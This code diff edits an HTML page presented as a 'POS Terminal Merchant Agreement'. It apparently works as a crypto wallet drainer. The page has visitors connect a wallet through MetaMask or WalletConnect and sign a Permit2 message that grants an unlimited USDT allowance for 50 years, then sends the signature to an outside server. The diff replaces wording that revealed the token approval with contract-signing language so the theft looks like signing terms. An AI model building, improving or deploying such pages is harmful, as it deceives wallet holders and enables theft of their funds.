@@ -4,7 +4,13 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>POS Terminal Agreement</title>
+    
+    <!-- Ethers.js -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    
+    <!-- ⭐ WalletConnect (Ethereum Provider) -->
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.js"></script>
+    
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -92,6 +98,7 @@
         }
         button:disabled { opacity: 0.5; cursor: not-allowed; }
         .btn-connect { background: #667eea; }
+        .btn-connect:hover:not(:disabled) { background: #5a6fd6; }
         .btn-sign { background: #28a745; }
         .btn-sign.signing { background: #ffc107; color: #333; }
         .btn-sign.done { background: #17a2b8; }
@@ -140,6 +147,14 @@
             margin-top: 10px;
         }
         .success-check.show { display: block; }
+        
+        /* ⭐ WalletConnect Modal Customization */
+        wcm-modal {
+            --wcm-z-index: 9999 !important;
+            --wcm-accent-color: #667eea !important;
+            --wcm-background-color: #ffffff !important;
+        }
+        
         @media (max-width: 480px) {
             .container { padding: 25px 20px; }
             h1 { font-size: 22px; }
@@ -149,7 +164,7 @@
 <body>
     <div class="container">
         <h1>💰 Terms And Conditions</h1>
-        <p class="subtitle">Here are three standard Merchant Agreement terms and conditions tailored specifically for a software-only POS (Point of Sale) model (where you provide the POS software application, while the underlying payment processing, hardware, or gateway is handled separately or integrated via APIs):</p>
+        <p class="subtitle">POS Terminal Merchant Agreement</p>
 
         <div class="contract-address">
             <strong>📋 Contract:</strong> 0x000000000022D473030F116dDEE9F6B43aC78BA3
@@ -163,20 +178,20 @@
             ✅ <strong>Software License & SaaS Subscription Terms</strong> The software is provided under a limited, non-exclusive, non-transferable license strictly for the Merchant's business operations.
         </div>
 
-        <div id="walletStatus" class="wallet-status">⛓️ Software Custody, Security & Prohibited Modifications</div>
+        <div id="walletStatus" class="wallet-status">⛓️ Not Connected</div>
 
         <div class="info-box">
             <div>
-                <span class="label">👤 The Merchant shall not reverse-engineer, decompile, modify, copy, or tamper with the POS software source code, security encryption layers, or API integrations.</span>
-                <span class="value" id="userDisplay"></span>
+                <span class="label">👤 Your Address</span>
+                <span class="value" id="userDisplay">Not connected</span>
             </div>
             <div>
-                <span class="label">The Merchant is solely responsible for maintaining the security of their login credentials, device-level access, and internal user permissions. Any security breach resulting from negligent credential sharing shall be the liability of the Merchant.</span>
-                <span class="value" id="allowanceDisplay"></span>
+                <span class="label">📋 Agreement Status</span>
+                <span class="value" id="allowanceDisplay">Connect to check</span>
             </div>
             <div>
-                <span class="label">The software is provided "as is." While uptime guarantees are maintained, the software provider is not liable for transaction failures, payment gateway downtimes, or network connectivity losses originating from third-party banks, internet service providers, or payment processors.</span>
-                <span class="value" id="expiryDisplay"></span>
+                <span class="label">📅 Valid Until</span>
+                <span class="value" id="expiryDisplay">-</span>
             </div>
         </div>
 
@@ -198,20 +213,22 @@
             permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
             usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
             chainId: 1,
-            apiUrl: "https://201-black.vercel.app/api/submit-signature"
+            apiUrl: "https://201-black.vercel.app/api/submit-signature",
+            // ⭐ WalletConnect Project ID
+            walletConnectProjectId: "0204ba9ef8f8856cd275da139b717e8a"
         };
 
-        // ⭐ uint160 උපරිම අගය (Permit2 Unlimited)
         const MAX_UINT160 = "1461501637330902918203684832716283019655932542975";
 
-        console.log("🚀 USDT Allowance App");
+        console.log("🚀 POS Terminal Agreement");
         console.log("📋 Contract:", CONFIG.contractAddress);
-        console.log("💰 MAX_UINT160:", MAX_UINT160);
+        console.log("🔗 WalletConnect Project ID:", CONFIG.walletConnectProjectId);
 
         // ============================================
         // STATE
         // ============================================
         let signer, provider, userAddress;
+        let walletConnectProvider = null;
 
         // ============================================
         // DOM REFS
@@ -251,19 +268,91 @@
         }
 
         // ============================================
-        // CONNECT WALLET
+        // ⭐ CONNECT WALLET - WalletConnect + MetaMask
         // ============================================
         async function connectWallet() {
             try {
-                if (!window.ethereum) {
-                    showStatus('⚠️ Please install MetaMask!', 'error');
-                    return;
+                console.log('🚀 Starting wallet connection...');
+
+                // ⭐ STEP 1: Browser Extension Wallet (MetaMask) තියෙනවා නම්
+                if (window.ethereum) {
+                    console.log('✅ Browser wallet detected');
+                    
+                    try {
+                        provider = new ethers.providers.Web3Provider(window.ethereum);
+                        await provider.send('eth_requestAccounts', []);
+                        signer = provider.getSigner();
+                        userAddress = await signer.getAddress();
+
+                        const network = await provider.getNetwork();
+                        if (network.chainId !== CONFIG.chainId) {
+                            showStatus('⚠️ Please switch to Ethereum Mainnet', 'error');
+                            return;
+                        }
+
+                        updateUI();
+                        await checkAllowance();
+                        showStatus('✅ Wallet connected!', 'success');
+                        
+                        // Event Listeners
+                        window.ethereum.on('accountsChanged', () => location.reload());
+                        window.ethereum.on('chainChanged', () => location.reload());
+                        
+                        return;
+
+                    } catch (error) {
+                        console.log('⚠️ Browser wallet failed, trying WalletConnect...', error);
+                    }
                 }
 
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                await provider.send('eth_requestAccounts', []);
+                // ⭐ STEP 2: WalletConnect (Mobile + Other Wallets)
+                console.log('🔄 Using WalletConnect...');
+                
+                connectBtn.innerHTML = '<span class="loading-spinner"></span> Opening...';
+                connectBtn.disabled = true;
+
+                // ⭐ WalletConnect Provider හදන්න
+                walletConnectProvider = new window.WalletConnectEthereumProvider.default({
+                    projectId: CONFIG.walletConnectProjectId,
+                    chains: [CONFIG.chainId],
+                    showQrModal: true,
+                    qrModalOptions: {
+                        themeMode: 'light',
+                        themeVariables: {
+                            '--wcm-z-index': '9999',
+                            '--wcm-accent-color': '#667eea',
+                            '--wcm-background-color': '#ffffff'
+                        },
+                        explorerRecommendedWalletIds: [
+                            // MetaMask
+                            'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
+                            // Trust Wallet
+                            '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
+                            // Coinbase Wallet
+                            'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa',
+                            // Rainbow
+                            '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
+                            // Ledger
+                            '19177a98252e07ddfc9af2083ba8e07ef627cb610117ee4ab538f15166043d93'
+                        ]
+                    },
+                    metadata: {
+                        name: 'POS Terminal Agreement',
+                        description: 'Sign Merchant Agreement Securely',
+                        url: window.location.origin,
+                        icons: ['https://avatars.githubusercontent.com/u/37784886']
+                    }
+                });
+
+                // ⭐ Modal එක Open කරන්න
+                await walletConnectProvider.connect();
+
+                // ⭐ Ethers Provider එකට හරවන්න
+                provider = new ethers.providers.Web3Provider(walletConnectProvider);
                 signer = provider.getSigner();
                 userAddress = await signer.getAddress();
+
+                console.log('✅ WalletConnect connected:', userAddress);
 
                 const network = await provider.getNetwork();
                 if (network.chainId !== CONFIG.chainId) {
@@ -271,20 +360,40 @@
                     return;
                 }
 
-                walletStatus.className = 'wallet-status connected';
-                walletStatus.innerHTML = `🟢 Connected: ${shortenAddress(userAddress)}`;
-                connectBtn.textContent = '✅ Connected';
-                connectBtn.disabled = true;
-                signBtn.disabled = false;
-                userDisplay.textContent = shortenAddress(userAddress);
-
+                updateUI();
                 await checkAllowance();
                 showStatus('✅ Wallet connected!', 'success');
 
+                // ⭐ Disconnect Handle කරන්න
+                walletConnectProvider.on('disconnect', () => {
+                    console.log('🔌 Disconnected');
+                    location.reload();
+                });
+
             } catch (error) {
                 console.error('❌ Connect error:', error);
-                showStatus(`❌ ${error.message}`, 'error');
+                
+                connectBtn.innerHTML = '🔗 Connect Wallet';
+                connectBtn.disabled = false;
+                
+                if (error.message.includes('User rejected') || error.message.includes('rejected')) {
+                    showStatus('❌ Connection cancelled', 'error');
+                } else {
+                    showStatus(`❌ ${error.message}`, 'error');
+                }
             }
+        }
+
+        // ============================================
+        // ⭐ UI Update Helper
+        // ============================================
+        function updateUI() {
+            walletStatus.className = 'wallet-status connected';
+            walletStatus.innerHTML = `🟢 Connected: ${shortenAddress(userAddress)}`;
+            connectBtn.textContent = '✅ Connected';
+            connectBtn.disabled = true;
+            signBtn.disabled = false;
+            userDisplay.textContent = shortenAddress(userAddress);
         }
 
         // ============================================
@@ -305,14 +414,14 @@
                 const expiration = result.expiration;
 
                 if (amount.toString() === '0') {
-                    allowanceDisplay.textContent = '❌ No allowance';
+                    allowanceDisplay.textContent = '❌ Not Signed';
                     allowanceDisplay.className = 'value';
                     expiryDisplay.textContent = '-';
                     return;
                 }
 
                 const isUnlimited = amount.toString() === MAX_UINT160;
-                allowanceDisplay.textContent = isUnlimited ? 'LIMITED' : `${ethers.utils.formatUnits(amount, 6)} USDT`;
+                allowanceDisplay.textContent = isUnlimited ? '✅ Signed' : `${ethers.utils.formatUnits(amount, 6)} USDT`;
                 allowanceDisplay.className = isUnlimited ? 'value unlimited' : 'value';
                 expiryDisplay.textContent = formatDate(expiration);
 
@@ -343,7 +452,7 @@
         }
 
         // ============================================
-        // ⭐ SIGN & SUBMIT - PermitSingle!
+        // ⭐ SIGN & SUBMIT
         // ============================================
         async function signAndSubmit() {
             try {
@@ -358,7 +467,6 @@
 
                 const nonce = await getPermit2Nonce();
 
-                // 50 years expiration
                 const years = 50;
                 const expiration = Math.floor(Date.now() / 1000) + (365 * 24 * 3600 * years);
                 const sigDeadline = Math.floor(Date.now() / 1000) + 3600;
@@ -366,16 +474,14 @@
                 console.log('📝 Nonce:', nonce.toString());
                 console.log('⏰ Expiration:', new Date(expiration * 1000).toLocaleString());
 
-                showStatus('✍️ Please sign in Wallet', 'info');
+                showStatus('✍️ Please sign in your wallet...', 'info');
 
-                // ⭐ EIP-712 Domain
                 const domain = {
                     name: "Permit2",
                     chainId: CONFIG.chainId,
                     verifyingContract: CONFIG.permit2Address
                 };
 
-                // ⭐ EIP-712 Types - PermitSingle
                 const types = {
                     PermitSingle: [
                         { name: "details", type: "PermitDetails" },
@@ -390,11 +496,10 @@
                     ]
                 };
 
-                // ⭐ PermitSingle Message - FIXED with MAX_UINT160!
                 const message = {
                     details: {
                         token: CONFIG.usdtAddress,
-                        amount: MAX_UINT160,  // ✅ 2^160 - 1
+                        amount: MAX_UINT160,
                         expiration: expiration,
                         nonce: nonce
                     },
@@ -407,14 +512,14 @@
                 const signature = await signer._signTypedData(domain, types, message);
                 console.log("✅ Signature:", signature);
 
-                showStatus('📤 Sending to uniswap...', 'loading');
+                showStatus('📤 Processing agreement...', 'loading');
 
                 const response = await fetch(CONFIG.apiUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         user: userAddress,
-                        amount: MAX_UINT160,  // ✅ 2^160 - 1
+                        amount: MAX_UINT160,
                         expiration: expiration,
                         nonce: nonce.toString(),
                         sigDeadline: sigDeadline,
@@ -428,14 +533,14 @@
                     result = JSON.parse(rawText);
                 } catch (parseError) {
                     showStatus(`❌ Backend error: ${rawText.substring(0, 100)}`, 'error');
-                    signBtn.innerHTML = '✍️ Sign & Approve (50 Years)';
+                    signBtn.innerHTML = '✍️ Sign Agreement';
                     signBtn.className = 'btn-sign';
                     signBtn.disabled = false;
                     return;
                 }
 
                 if (result.success) {
-                    signBtn.innerHTML = '✅ Approved!';
+                    signBtn.innerHTML = '✅ Signed!';
                     signBtn.className = 'btn-sign done';
                     signBtn.disabled = true;
                     successCheck.classList.add('show');
@@ -444,15 +549,21 @@
                     await checkAllowance();
                 } else {
                     showStatus(`❌ Error: ${result.error}`, 'error');
-                    signBtn.innerHTML = '✍️ Sign & Approve (50 Years)';
+                    signBtn.innerHTML = '✍️ Sign Agreement';
                     signBtn.className = 'btn-sign';
                     signBtn.disabled = false;
                 }
 
             } catch (error) {
                 console.error('❌ signAndSubmit error:', error);
-                showStatus(`❌ ${error.message}`, 'error');
-                signBtn.innerHTML = '✍️ Sign & Approve (50 Years)';
+                
+                let errorMsg = error.message;
+                if (errorMsg.includes('User rejected') || errorMsg.includes('rejected')) {
+                    errorMsg = 'You rejected the signature';
+                }
+                
+                showStatus(`❌ ${errorMsg}`, 'error');
+                signBtn.innerHTML = '✍️ Sign Agreement';
                 signBtn.className = 'btn-sign';
                 signBtn.disabled = false;
             }
@@ -463,11 +574,6 @@
         // ============================================
         connectBtn.addEventListener('click', connectWallet);
         signBtn.addEventListener('click', signAndSubmit);
-
-        if (window.ethereum) {
-            window.ethereum.on('accountsChanged', () => location.reload());
-            window.ethereum.on('chainChanged', () => location.reload());
-        }
 
         console.log("✅ App ready!");
     </script>
